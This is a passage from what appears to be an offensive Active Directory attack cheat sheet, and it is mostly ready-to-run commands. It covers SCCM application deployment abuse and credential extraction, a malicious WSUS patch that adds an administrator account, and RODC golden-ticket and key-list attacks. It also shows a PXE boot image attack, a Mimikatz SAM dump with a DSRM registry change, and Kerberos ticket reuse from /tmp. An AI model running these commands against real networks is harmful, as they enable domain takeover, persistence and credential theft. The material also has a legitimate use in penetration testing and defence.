    <div class="highlight"><pre><span></span><code><a id="__codelineno-309-1" name="__codelineno-309-1" href="#__codelineno-309-1"></a><span class="n">MalSCCM</span><span class="p">.</span><span class="n">exe</span> <span class="n">app</span> <span class="p">/</span><span class="n">create</span> <span class="p">/</span><span class="n">name</span><span class="p">:</span><span class="n">demoapp</span> <span class="p">/</span><span class="n">uncpath</span><span class="p">:</span><span class="s2">&quot;\\BLORE-SCCM\SCCMContentLib$\localthread.exe&quot;</span>
<a id="__codelineno-309-2" name="__codelineno-309-2" href="#__codelineno-309-2"></a><span class="n">MalSCCM</span><span class="p">.</span><span class="n">exe</span> <span class="n">inspect</span> <span class="p">/</span><span class="n">applications</span>
</code></pre></div></p>
</li>
<li>
<p>Deploy the application to the target group 
    <div class="highlight"><pre><span></span><code><a id="__codelineno-310-1" name="__codelineno-310-1" href="#__codelineno-310-1"></a><span class="n">MalSCCM</span><span class="p">.</span><span class="n">exe</span> <span class="n">app</span> <span class="p">/</span><span class="n">deploy</span> <span class="p">/</span><span class="n">name</span><span class="p">:</span><span class="n">demoapp</span> <span class="p">/</span><span class="n">groupname</span><span class="p">:</span><span class="n">TargetGroup</span> <span class="p">/</span><span class="n">assignmentname</span><span class="p">:</span><span class="n">demodeployment</span>
<a id="__codelineno-310-2" name="__codelineno-310-2" href="#__codelineno-310-2"></a><span class="n">MalSCCM</span><span class="p">.</span><span class="n">exe</span> <span class="n">inspect</span> <span class="p">/</span><span class="n">deployments</span>
</code></pre></div></p>
</li>
<li>
<p>Force the target group to checkin for updates 
    <div class="highlight"><pre><span></span><code><a id="__codelineno-311-1" name="__codelineno-311-1" href="#__codelineno-311-1"></a><span class="n">MalSCCM</span><span class="p">.</span><span class="n">exe</span> <span class="n">checkin</span> <span class="p">/</span><span class="n">groupname</span><span class="p">:</span><span class="n">TargetGroup</span>
</code></pre></div></p>
</li>
<li>
<p>Cleanup the application, deployment and group
    <div class="highlight"><pre><span></span><code><a id="__codelineno-312-1" name="__codelineno-312-1" href="#__codelineno-312-1"></a><span class="n">MalSCCM</span><span class="p">.</span><span class="n">exe</span> <span class="n">app</span> <span class="p">/</span><span class="n">cleanup</span> <span class="p">/</span><span class="n">name</span><span class="p">:</span><span class="n">demoapp</span>
<a id="__codelineno-312-2" name="__codelineno-312-2" href="#__codelineno-312-2"></a><span class="n">MalSCCM</span><span class="p">.</span><span class="n">exe</span> <span class="nb">group </span><span class="p">/</span><span class="n">delete</span> <span class="p">/</span><span class="n">groupname</span><span class="p">:</span><span class="n">TargetGroup</span>
</code></pre></div></p>
</li>
</ul>
<h2 id="sccm-network-access-accounts">SCCM Network Access Accounts</h2>
<blockquote>
<p>If you can escalate on a host that is an SCCM client, you can retrieve plaintext domain credentials.</p>
</blockquote>
<ul>
<li>Find SCCM blob
    <div class="highlight"><pre><span></span><code><a id="__codelineno-313-1" name="__codelineno-313-1" href="#__codelineno-313-1"></a><span class="nb">Get-Wmiobject</span> <span class="n">-namespace</span> <span class="s2">&quot;root\ccm\policy\Machine\ActualConfig&quot;</span> <span class="n">-class</span> <span class="s2">&quot;CCM_NetworkAccessAccount&quot;</span>
<a id="__codelineno-313-2" name="__codelineno-313-2" href="#__codelineno-313-2"></a><span class="n">NetworkAccessPassword</span> <span class="p">:</span> <span class="p">&lt;!</span><span class="no">[CDATA[E600000001...8C6B5]]</span><span class="p">&gt;</span>
<a id="__codelineno-313-3" name="__codelineno-313-3" href="#__codelineno-313-3"></a><span class="n">NetworkAccessUsername</span> <span class="p">:</span> <span class="p">&lt;!</span><span class="no">[CDATA[E600000001...00F92]]</span><span class="p">&gt;</span>
</code></pre></div></li>
<li>Using <a href="https://github.com/GhostPack/SharpDPAPI/blob/81e1fcdd44e04cf84ca0085cf5db2be4f7421903/SharpDPAPI/Commands/SCCM.cs#L208-L244">GhostPack/SharpDPAPI</a> or <a href="https://github.com/Mayyhem/SharpSCCM">Mayyhem/SharpSCCM</a> for SCCM retrieval and decryption
    <div class="highlight"><pre><span></span><code><a id="__codelineno-314-1" name="__codelineno-314-1" href="#__codelineno-314-1"></a><span class="p">.\</span><span class="n">SharpDPAPI</span><span class="p">.</span><span class="n">exe</span> <span class="n">SCCM</span>
<a id="__codelineno-314-2" name="__codelineno-314-2" href="#__codelineno-314-2"></a><span class="p">.\</span><span class="n">SharpSCCM</span><span class="p">.</span><span class="n">exe</span> <span class="n">get</span> <span class="n">naa</span> <span class="n">-u</span> <span class="n">USERNAME</span> <span class="n">-p</span> <span class="n">PASSWORD</span>
</code></pre></div></li>
<li>Check ACL for the CIM repository located at <code>C:\Windows\System32\wbem\Repository\OBJECTS.DATA</code>:
    <div class="highlight"><pre><span></span><code><a id="__codelineno-315-1" name="__codelineno-315-1" href="#__codelineno-315-1"></a><span class="nb">Get-Acl</span> <span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">System32</span><span class="p">\</span><span class="n">wbem</span><span class="p">\</span><span class="n">Repository</span><span class="p">\</span><span class="n">OBJECTS</span><span class="p">.</span><span class="n">DATA</span> <span class="p">|</span> <span class="nb">Format-List</span> <span class="n">-Property</span> <span class="n">PSPath</span><span class="p">,</span><span class="n">sddl</span>
<a id="__codelineno-315-2" name="__codelineno-315-2" href="#__codelineno-315-2"></a><span class="nb">ConvertFrom-SddlString</span> <span class="s2">&quot;&quot;</span>
</code></pre></div></li>
</ul>
<h2 id="sccm-shares">SCCM Shares</h2>
<blockquote>
<p>Find interesting files stored on (System Center) Configuration Manager (SCCM/CM) SMB shares</p>
</blockquote>
<ul>
<li><a href="https://github.com/1njected/CMLoot">1njected/CMLoot</a>
  <div class="highlight"><pre><span></span><code><a id="__codelineno-316-1" name="__codelineno-316-1" href="#__codelineno-316-1"></a><span class="nb">Invoke-CMLootInventory</span> <span class="n">-SCCMHost</span> <span class="n">sccm01</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">local</span> <span class="n">-Outfile</span> <span class="n">sccmfiles</span><span class="p">.</span><span class="n">txt</span>
<a id="__codelineno-316-2" name="__codelineno-316-2" href="#__codelineno-316-2"></a><span class="nb">Invoke-CMLootDownload</span> <span class="n">-SingleFile</span> <span class="p">\\</span><span class="n">sccm</span><span class="p">\</span><span class="n">SCCMContentLib</span><span class="p">$\</span><span class="n">DataLib</span><span class="p">\</span><span class="n">SC100001</span><span class="p">.</span><span class="n">1</span><span class="p">\</span><span class="n">x86</span><span class="p">\</span><span class="n">MigApp</span><span class="p">.</span><span class="n">xml</span>
<a id="__codelineno-316-3" name="__codelineno-316-3" href="#__codelineno-316-3"></a><span class="nb">Invoke-CMLootDownload</span> <span class="n">-InventoryFile</span> <span class="p">.\</span><span class="n">sccmfiles</span><span class="p">.</span><span class="n">txt</span> <span class="n">-Extension</span> <span class="n">msi</span>
</code></pre></div></li>
</ul>
<h2 id="wsus-deployment">WSUS Deployment</h2>
<blockquote>
<p>Windows Server Update Services (WSUS) enables information technology administrators to deploy the latest Microsoft product updates. You can use WSUS to fully manage the distribution of updates that are released through Microsoft Update to computers on your network</p>
</blockquote>
<p><img alt="⚠" class="twemoji" src="https://cdnjs.cloudflare.com/ajax/libs/twemoji/14.0.2/svg/26a0.svg" title=":warning:" /> The payload must be a Microsoft signed binary and must point to a location on disk for the WSUS server to load that binary.</p>
<ul>
<li>
<p><a href="https://github.com/nettitude/SharpWSUS">SharpWSUS</a></p>
</li>
<li>
<p>Locate using <code>HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate</code> or <code>SharpWSUS.exe locate</code></p>
</li>
<li>After WSUS Server compromise: <code>SharpWSUS.exe inspect</code></li>
<li>Create a malicious patch: <code>SharpWSUS.exe create /payload:"C:\Users\ben\Documents\pk\psexec.exe" /args:"-accepteula -s -d cmd.exe /c \"net user WSUSDemo Password123! /add ^&amp; net localgroup administrators WSUSDemo /add\"" /title:"WSUSDemo"</code></li>
<li>Deploy it on the target: <code>SharpWSUS.exe approve /updateid:5d667dfd-c8f0-484d-8835-59138ac0e127 /computername:bloredc2.blorebank.local /groupname:"Demo Group"</code></li>
<li>Check status deployment: <code>SharpWSUS.exe check /updateid:5d667dfd-c8f0-484d-8835-59138ac0e127 /computername:bloredc2.blorebank.local</code></li>
<li>Clean up: <code>SharpWSUS.exe delete /updateid:5d667dfd-c8f0-484d-8835-59138ac0e127 /computername:bloredc2.blorebank.local /groupname:”Demo Group</code></li>
</ul>
<h2 id="rodc-read-only-domain-controller">RODC - Read Only Domain Controller</h2>
<p>RODCs are an alternative for Domain Controllers in less secure physical locations
- Contains a filtered copy of AD (LAPS and Bitlocker keys are excluded)
- Any user or group specified in the <strong>managedBy</strong> attribute of an RODC has local admin access to the RODC server</p>
<h3 id="rodc-golden-ticket">RODC Golden Ticket</h3>
<ul>
<li>You can forge an RODC golden ticket and present it to a writable Domain Controller only for principals listed in the RODC’s <strong>msDS-RevealOnDemandGroup</strong> attribute and not in the RODC’s <strong>msDS-NeverRevealGroup</strong> attribute</li>
</ul>
<h3 id="rodc-key-list-attack">RODC Key List Attack</h3>
<p><strong>Requirements</strong>:
* <a href="https://github.com/SecureAuthCorp/impacket/pull/1210">Impacket PR #1210 - The Kerberos Key List Attack</a>
* <strong>krbtgt</strong> credentials of the RODC (-rodcKey) 
* <strong>ID of the krbtgt</strong> account of the RODC (-rodcNo)</p>
<ul>
<li>using Impacket
  <div class="highlight"><pre><span></span><code><a id="__codelineno-317-1" name="__codelineno-317-1" href="#__codelineno-317-1"></a><span class="c"># keylistattack.py using SAMR user enumeration without filtering (-full flag)</span>
<a id="__codelineno-317-2" name="__codelineno-317-2" href="#__codelineno-317-2"></a><span class="n">keylistattack</span><span class="p">.</span><span class="n">py</span> <span class="n">DOMAIN</span><span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">password</span><span class="nv">@host</span> <span class="n">-rodcNo</span> <span class="n">XXXXX</span> <span class="n">-rodcKey</span> <span class="n">XXXXXXXXXXXXXXXXXXXX</span> <span class="n">-full</span>
<a id="__codelineno-317-3" name="__codelineno-317-3" href="#__codelineno-317-3"></a>
<a id="__codelineno-317-4" name="__codelineno-317-4" href="#__codelineno-317-4"></a><span class="c"># keylistattack.py defining a target username (-t flag)</span>
<a id="__codelineno-317-5" name="__codelineno-317-5" href="#__codelineno-317-5"></a><span class="n">keylistattack</span><span class="p">.</span><span class="n">py</span> <span class="n">-kdc</span> <span class="n">server</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">local</span> <span class="n">-t</span> <span class="n">user</span> <span class="n">-rodcNo</span> <span class="n">XXXXX</span> <span class="n">-rodcKey</span> <span class="n">XXXXXXXXXXXXXXXXXXXX</span> <span class="n">LIST</span>
<a id="__codelineno-317-6" name="__codelineno-317-6" href="#__codelineno-317-6"></a>
<a id="__codelineno-317-7" name="__codelineno-317-7" href="#__codelineno-317-7"></a><span class="c"># secretsdump.py using the Kerberos Key List Attack option (-use-keylist)</span>
<a id="__codelineno-317-8" name="__codelineno-317-8" href="#__codelineno-317-8"></a><span class="n">secretsdump</span><span class="p">.</span><span class="n">py</span> <span class="n">DOMAIN</span><span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">password</span><span class="nv">@host</span> <span class="n">-rodcNo</span> <span class="n">XXXXX</span> <span class="n">-rodcKey</span> <span class="n">XXXXXXXXXXXXXXXXXXXX</span> <span class="n">-use-keylist</span>
</code></pre></div></li>
<li>Using Rubeus
  <div class="highlight"><pre><span></span><code><a id="__codelineno-318-1" name="__codelineno-318-1" href="#__codelineno-318-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">golden</span> <span class="p">/</span><span class="n">rodcNumber</span><span class="p">:</span><span class="n">25078</span> <span class="p">/</span><span class="n">aes256</span><span class="p">:</span><span class="n">eacd894dd0d934e84de35860ce06a4fac591ca63c228ddc1c7a0ebbfa64c7545</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">admin</span> <span class="p">/</span><span class="n">id</span><span class="p">:</span><span class="n">1136</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">lab</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">sid</span><span class="p">:</span><span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">1437000690</span><span class="p">-</span><span class="n">1664695696</span><span class="p">-</span><span class="n">1586295871</span>
<a id="__codelineno-318-2" name="__codelineno-318-2" href="#__codelineno-318-2"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">asktgs</span> <span class="p">/</span><span class="n">enctype</span><span class="p">:</span><span class="n">aes256</span> <span class="p">/</span><span class="n">keyList</span> <span class="p">/</span><span class="n">service</span><span class="p">:</span><span class="n">krbtgt</span><span class="p">/</span><span class="n">lab</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">dc</span><span class="p">:</span><span class="n">dc1</span><span class="p">.</span><span class="n">lab</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">ticket</span><span class="p">:</span><span class="n">doIFgzCC</span><span class="p">[...]</span><span class="n">wIBBxhYnM</span><span class="p">=</span>
</code></pre></div></li>
</ul>
<h3 id="rodc-computer-object">RODC Computer Object</h3>
<p>When you have one the following permissions to the RODC computer object: <strong>GenericWrite</strong>, <strong>GenericAll</strong>, <strong>WriteDacl</strong>, <strong>Owns</strong>, <strong>WriteOwner</strong>, <strong>WriteProperty</strong>.</p>
<ul>
<li>Add a domain admin account to the RODC's <strong>msDS-RevealOnDemandGroup</strong> attribute 
  <div class="highlight"><pre><span></span><code><a id="__codelineno-319-1" name="__codelineno-319-1" href="#__codelineno-319-1"></a><span class="n">PowerSploit</span><span class="p">&gt;</span> <span class="nb">Set-DomainObject</span> <span class="n">-Identity</span> <span class="n">RODC</span><span class="p">$</span> <span class="n">-Set</span> <span class="p">@{</span><span class="s1">&#39;msDS-RevealOnDemandGroup&#39;</span><span class="p">=@(</span><span class="s1">&#39;CN=Allowed RODC Password Replication Group,CN=Users,DC=domain,DC=local&#39;</span><span class="p">,</span> <span class="s1">&#39;CN=Administrator,CN=Users,DC=domain,DC=local&#39;</span><span class="p">)}</span>
</code></pre></div></li>
</ul>
<h2 id="pxe-boot-image-attack">PXE Boot image attack</h2>
<p>PXE allows a workstation to boot from the network by retrieving an operating system image from a server using TFTP (Trivial FTP) protocol. This boot over the network allows an attacker to fetch the image and interact with it.</p>
<ul>
<li>Press <strong>[F8]</strong> during the PXE boot to spawn an administrator console on the deployed machine.</li>
<li>
<p>Press <strong>[SHIFT+F10]</strong> during the initial Windows setup process to bring up a system console, then add a local administrator or dump SAM/SYSTEM registry.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-320-1" name="__codelineno-320-1" href="#__codelineno-320-1"></a><span class="n">net</span> <span class="n">user</span> <span class="n">hacker</span> <span class="n">Password123</span><span class="p">!</span> <span class="p">/</span><span class="n">add</span>
<a id="__codelineno-320-2" name="__codelineno-320-2" href="#__codelineno-320-2"></a><span class="n">net</span> <span class="n">localgroup</span> <span class="n">administrators</span> <span class="p">/</span><span class="n">add</span> <span class="n">hacker</span>
</code></pre></div>
</li>
<li>
<p>Extract the pre-boot image (wim files) using <a href="https://github.com/wavestone-cdt/powerpxe">PowerPXE.ps1 (https://github.com/wavestone-cdt/powerpxe)</a> and dig through it to find default passwords and domain accounts.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-321-1" name="__codelineno-321-1" href="#__codelineno-321-1"></a><span class="c"># Import the module</span>
<a id="__codelineno-321-2" name="__codelineno-321-2" href="#__codelineno-321-2"></a><span class="nb">PS </span><span class="p">&gt;</span> <span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">PowerPXE</span><span class="p">.</span><span class="n">ps1</span>
<a id="__codelineno-321-3" name="__codelineno-321-3" href="#__codelineno-321-3"></a>
<a id="__codelineno-321-4" name="__codelineno-321-4" href="#__codelineno-321-4"></a><span class="c"># Start the exploit on the Ethernet interface</span>
<a id="__codelineno-321-5" name="__codelineno-321-5" href="#__codelineno-321-5"></a><span class="nb">PS </span><span class="p">&gt;</span> <span class="nb">Get-PXEcreds</span> <span class="n">-InterfaceAlias</span> <span class="n">Ethernet</span>
<a id="__codelineno-321-6" name="__codelineno-321-6" href="#__codelineno-321-6"></a><span class="nb">PS </span><span class="p">&gt;</span> <span class="nb">Get-PXECreds</span> <span class="n">-InterfaceAlias</span> <span class="err">«</span> <span class="n">lab</span> <span class="n">0</span> <span class="err">»</span> 
<a id="__codelineno-321-7" name="__codelineno-321-7" href="#__codelineno-321-7"></a>
<a id="__codelineno-321-8" name="__codelineno-321-8" href="#__codelineno-321-8"></a><span class="c"># Wait for the DHCP to get an address</span>
<a id="__codelineno-321-9" name="__codelineno-321-9" href="#__codelineno-321-9"></a><span class="p">&gt;&gt;</span> <span class="n">Get</span> <span class="n">a</span> <span class="n">valid</span> <span class="n">IP</span> <span class="n">address</span>
<a id="__codelineno-321-10" name="__codelineno-321-10" href="#__codelineno-321-10"></a><span class="p">&gt;&gt;&gt;</span> <span class="p">&gt;&gt;&gt;</span> <span class="n">DHCP</span> <span class="n">proposal</span> <span class="n">IP</span> <span class="n">address</span><span class="p">:</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">22</span><span class="p">.</span><span class="n">101</span>
<a id="__codelineno-321-11" name="__codelineno-321-11" href="#__codelineno-321-11"></a><span class="p">&gt;&gt;&gt;</span> <span class="p">&gt;&gt;&gt;</span> <span class="n">DHCP</span> <span class="n">Validation</span><span class="p">:</span> <span class="n">DHCPACK</span>
<a id="__codelineno-321-12" name="__codelineno-321-12" href="#__codelineno-321-12"></a><span class="p">&gt;&gt;&gt;</span> <span class="p">&gt;&gt;&gt;</span> <span class="n">IP</span> <span class="n">address</span> <span class="n">configured</span><span class="p">:</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">22</span><span class="p">.</span><span class="n">101</span>
<a id="__codelineno-321-13" name="__codelineno-321-13" href="#__codelineno-321-13"></a>
<a id="__codelineno-321-14" name="__codelineno-321-14" href="#__codelineno-321-14"></a><span class="c"># Extract BCD path from the DHCP response</span>
<a id="__codelineno-321-15" name="__codelineno-321-15" href="#__codelineno-321-15"></a><span class="p">&gt;&gt;</span> <span class="n">Request</span> <span class="n">BCD</span> <span class="n">File</span> <span class="n">path</span>
<a id="__codelineno-321-16" name="__codelineno-321-16" href="#__codelineno-321-16"></a><span class="p">&gt;&gt;&gt;</span> <span class="p">&gt;&gt;&gt;</span> <span class="n">BCD</span> <span class="n">File</span> <span class="n">path</span><span class="p">:</span>  <span class="p">\</span><span class="n">Tmp</span><span class="p">\</span><span class="n">x86x64</span><span class="p">{</span><span class="n">5AF4E332-C90A</span><span class="p">-</span><span class="n">4015</span><span class="p">-</span><span class="n">9BA2-F8A7C9FF04E6</span><span class="p">}.</span><span class="n">bcd</span>
<a id="__codelineno-321-17" name="__codelineno-321-17" href="#__codelineno-321-17"></a><span class="p">&gt;&gt;&gt;</span> <span class="p">&gt;&gt;&gt;</span> <span class="n">TFTP</span> <span class="n">IP</span> <span class="n">Address</span><span class="p">:</span>  <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">22</span><span class="p">.</span><span class="n">3</span>
<a id="__codelineno-321-18" name="__codelineno-321-18" href="#__codelineno-321-18"></a>
<a id="__codelineno-321-19" name="__codelineno-321-19" href="#__codelineno-321-19"></a><span class="c"># Download the BCD file and extract wim files</span>
<a id="__codelineno-321-20" name="__codelineno-321-20" href="#__codelineno-321-20"></a><span class="p">&gt;&gt;</span> <span class="n">Launch</span> <span class="n">TFTP</span> <span class="n">download</span>
<a id="__codelineno-321-21" name="__codelineno-321-21" href="#__codelineno-321-21"></a><span class="p">&gt;&gt;&gt;&gt;</span> <span class="n">Transfer</span> <span class="n">succeeded</span><span class="p">.</span>
<a id="__codelineno-321-22" name="__codelineno-321-22" href="#__codelineno-321-22"></a><span class="p">&gt;&gt;</span> <span class="n">Parse</span> <span class="n">the</span> <span class="n">BCD</span> <span class="n">file</span><span class="p">:</span> <span class="n">conf</span><span class="p">.</span><span class="n">bcd</span>
<a id="__codelineno-321-23" name="__codelineno-321-23" href="#__codelineno-321-23"></a><span class="p">&gt;&gt;&gt;&gt;</span> <span class="n">Identify</span> <span class="n">wim</span> <span class="n">file</span> <span class="p">:</span> <span class="p">\</span><span class="n">Boot</span><span class="p">\</span><span class="n">x86</span><span class="p">\</span><span class="n">Images</span><span class="p">\</span><span class="n">LiteTouchPE_x86</span><span class="p">.</span><span class="n">wim</span>
<a id="__codelineno-321-24" name="__codelineno-321-24" href="#__codelineno-321-24"></a><span class="p">&gt;&gt;&gt;&gt;</span> <span class="n">Identify</span> <span class="n">wim</span> <span class="n">file</span> <span class="p">:</span> <span class="p">\</span><span class="n">Boot</span><span class="p">\</span><span class="n">x64</span><span class="p">\</span><span class="n">Images</span><span class="p">\</span><span class="n">LiteTouchPE_x64</span><span class="p">.</span><span class="n">wim</span>
<a id="__codelineno-321-25" name="__codelineno-321-25" href="#__codelineno-321-25"></a><span class="p">&gt;&gt;</span> <span class="n">Launch</span> <span class="n">TFTP</span> <span class="n">download</span>
<a id="__codelineno-321-26" name="__codelineno-321-26" href="#__codelineno-321-26"></a><span class="p">&gt;&gt;&gt;&gt;</span> <span class="n">Transfer</span> <span class="n">succeeded</span><span class="p">.</span>
<a id="__codelineno-321-27" name="__codelineno-321-27" href="#__codelineno-321-27"></a>
<a id="__codelineno-321-28" name="__codelineno-321-28" href="#__codelineno-321-28"></a><span class="c"># Parse wim files to find interesting data</span>
<a id="__codelineno-321-29" name="__codelineno-321-29" href="#__codelineno-321-29"></a><span class="p">&gt;&gt;</span> <span class="n">Open</span> <span class="n">LiteTouchPE_x86</span><span class="p">.</span><span class="n">wim</span>
<a id="__codelineno-321-30" name="__codelineno-321-30" href="#__codelineno-321-30"></a><span class="p">&gt;&gt;&gt;&gt;</span> <span class="n">Finding</span> <span class="n">Bootstrap</span><span class="p">.</span><span class="n">ini</span>
<a id="__codelineno-321-31" name="__codelineno-321-31" href="#__codelineno-321-31"></a><span class="p">&gt;&gt;&gt;&gt;</span> <span class="p">&gt;&gt;&gt;&gt;</span> <span class="n">DeployRoot</span> <span class="p">=</span> <span class="p">\\</span><span class="n">LAB-MDT</span><span class="p">\</span><span class="n">DeploymentShare</span><span class="p">$</span>
<a id="__codelineno-321-32" name="__codelineno-321-32" href="#__codelineno-321-32"></a><span class="p">&gt;&gt;&gt;&gt;</span> <span class="p">&gt;&gt;&gt;&gt;</span> <span class="n">UserID</span> <span class="p">=</span> <span class="n">MdtService</span>
<a id="__codelineno-321-33" name="__codelineno-321-33" href="#__codelineno-321-33"></a><span class="p">&gt;&gt;&gt;&gt;</span> <span class="p">&gt;&gt;&gt;&gt;</span> <span class="n">UserPassword</span> <span class="p">=</span> <span class="n">Somepass1</span>
</code></pre></div>
</li>
</ul>
<h2 id="dns-reconnaissance">DNS Reconnaissance</h2>
<p>Perform ADIDNS searches</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-322-1" name="__codelineno-322-1" href="#__codelineno-322-1"></a><span class="n">StandIn</span><span class="p">.</span><span class="n">exe</span> <span class="p">-</span><span class="n">-dns</span> <span class="p">-</span><span class="n">-limit</span> <span class="n">20</span>
<a id="__codelineno-322-2" name="__codelineno-322-2" href="#__codelineno-322-2"></a><span class="n">StandIn</span><span class="p">.</span><span class="n">exe</span> <span class="p">-</span><span class="n">-dns</span> <span class="p">-</span><span class="n">-filter</span> <span class="n">SQL</span> <span class="p">-</span><span class="n">-limit</span> <span class="n">10</span>
<a id="__codelineno-322-3" name="__codelineno-322-3" href="#__codelineno-322-3"></a><span class="n">StandIn</span><span class="p">.</span><span class="n">exe</span> <span class="p">-</span><span class="n">-dns</span> <span class="p">-</span><span class="n">-forest</span> <span class="p">-</span><span class="n">-domain</span> <span class="n">redhook</span> <span class="p">-</span><span class="n">-user</span> <span class="n">RFludd</span> <span class="p">-</span><span class="n">-pass</span> <span class="n">Cl4vi</span><span class="nv">$Alchemi4e</span>
<a id="__codelineno-322-4" name="__codelineno-322-4" href="#__codelineno-322-4"></a><span class="n">StandIn</span><span class="p">.</span><span class="n">exe</span> <span class="p">-</span><span class="n">-dns</span> <span class="p">-</span><span class="n">-legacy</span> <span class="p">-</span><span class="n">-domain</span> <span class="n">redhook</span> <span class="p">-</span><span class="n">-user</span> <span class="n">RFludd</span> <span class="p">-</span><span class="n">-pass</span> <span class="n">Cl4vi</span><span class="nv">$Alchemi4e</span>
</code></pre></div>
<h2 id="dsrm-credentials">DSRM Credentials</h2>
<blockquote>
<p>Directory Services Restore Mode (DSRM) is a safe mode boot option for Windows Server domain controllers. DSRM allows an administrator to repair or recover to repair or restore an Active Directory database.</p>
</blockquote>
<p>This is the local administrator account inside each DC. Having admin privileges in this machine, you can use mimikatz to dump the local Administrator hash. Then, modifying a registry to activate this password so you can remotely access to this local Administrator user.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-323-1" name="__codelineno-323-1" href="#__codelineno-323-1"></a><span class="nb">Invoke-Mimikatz</span> <span class="n">-Command</span> <span class="s1">&#39;&quot;token::elevate&quot; &quot;lsadump::sam&quot;&#39;</span>
<a id="__codelineno-323-2" name="__codelineno-323-2" href="#__codelineno-323-2"></a>
<a id="__codelineno-323-3" name="__codelineno-323-3" href="#__codelineno-323-3"></a><span class="c"># Check if the key exists and get the value</span>
<a id="__codelineno-323-4" name="__codelineno-323-4" href="#__codelineno-323-4"></a><span class="nb">Get-ItemProperty</span> <span class="s2">&quot;HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA&quot;</span> <span class="n">-name</span> <span class="n">DsrmAdminLogonBehavior</span> 
<a id="__codelineno-323-5" name="__codelineno-323-5" href="#__codelineno-323-5"></a>
<a id="__codelineno-323-6" name="__codelineno-323-6" href="#__codelineno-323-6"></a><span class="c"># Create key with value &quot;2&quot; if it doesn&#39;t exist</span>
<a id="__codelineno-323-7" name="__codelineno-323-7" href="#__codelineno-323-7"></a><span class="nb">New-ItemProperty</span> <span class="s2">&quot;HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA&quot;</span> <span class="n">-name</span> <span class="n">DsrmAdminLogonBehavior</span> <span class="n">-value</span> <span class="n">2</span> <span class="n">-PropertyType</span> <span class="n">DWORD</span> 
<a id="__codelineno-323-8" name="__codelineno-323-8" href="#__codelineno-323-8"></a>
<a id="__codelineno-323-9" name="__codelineno-323-9" href="#__codelineno-323-9"></a><span class="c"># Change value to &quot;2&quot;</span>
<a id="__codelineno-323-10" name="__codelineno-323-10" href="#__codelineno-323-10"></a><span class="nb">Set-ItemProperty</span> <span class="s2">&quot;HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA&quot;</span> <span class="n">-name</span> <span class="n">DsrmAdminLogonBehavior</span> <span class="n">-value</span> <span class="n">2</span>
</code></pre></div>
<h2 id="linux-active-directory">Linux Active Directory</h2>
<h2 id="ccache-ticket-reuse-from-tmp">CCACHE ticket reuse from /tmp</h2>
<blockquote>
<p>When tickets are set to be stored as a file on disk, the standard format and type is a CCACHE file. This is a simple binary file format to store Kerberos credentials. These files are typically stored in /tmp and scoped with 600 permissions</p>
</blockquote>
<p>List the current ticket used for authentication with <code>env | grep KRB5CCNAME</code>. The format is portable and the ticket can be reused by setting the environment variable with <code>export KRB5CCNAME=/tmp/ticket.ccache</code>. Kerberos ticket name format is <code>krb5cc_%{uid}</code> where uid is the user UID. </p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-324-1" name="__codelineno-324-1" href="#__codelineno-324-1"></a><span class="p">$</span> <span class="nb">ls </span><span class="p">/</span><span class="n">tmp</span><span class="p">/</span> <span class="p">|</span> <span class="n">grep</span> <span class="n">krb5cc</span>
<a id="__codelineno-324-2" name="__codelineno-324-2" href="#__codelineno-324-2"></a><span class="n">krb5cc_1000</span>
<a id="__codelineno-324-3" name="__codelineno-324-3" href="#__codelineno-324-3"></a><span class="n">krb5cc_1569901113</span>
<a id="__codelineno-324-4" name="__codelineno-324-4" href="#__codelineno-324-4"></a><span class="n">krb5cc_1569901115</span>
<a id="__codelineno-324-5" name="__codelineno-324-5" href="#__codelineno-324-5"></a>
<a id="__codelineno-324-6" name="__codelineno-324-6" href="#__codelineno-324-6"></a><span class="p">$</span> <span class="n">export</span> <span class="n">KRB5CCNAME</span><span class="p">=/</span><span class="n">tmp</span><span class="p">/</span><span class="n">krb5cc_1569901115</span>
</code></pre></div>
<h2 id="ccache-ticket-reuse-from-keyring">CCACHE ticket reuse from keyring</h2>
<p>Tool to extract Kerberos tickets from Linux kernel keys : https://github.com/TarlogicSecurity/tickey</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-325-1" name="__codelineno-325-1" href="#__codelineno-325-1"></a><span class="c"># Configuration and build</span>
<a id="__codelineno-325-2" name="__codelineno-325-2" href="#__codelineno-325-2"></a><span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="p">://</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">TarlogicSecurity</span><span class="p">/</span><span class="n">tickey</span>
<a id="__codelineno-325-3" name="__codelineno-325-3" href="#__codelineno-325-3"></a><span class="nb">cd </span><span class="n">tickey</span><span class="p">/</span><span class="n">tickey</span>
<a id="__codelineno-325-4" name="__codelineno-325-4" href="#__codelineno-325-4"></a><span class="n">make</span> <span class="n">CONF</span><span class="p">=</span><span class="n">Release</span>
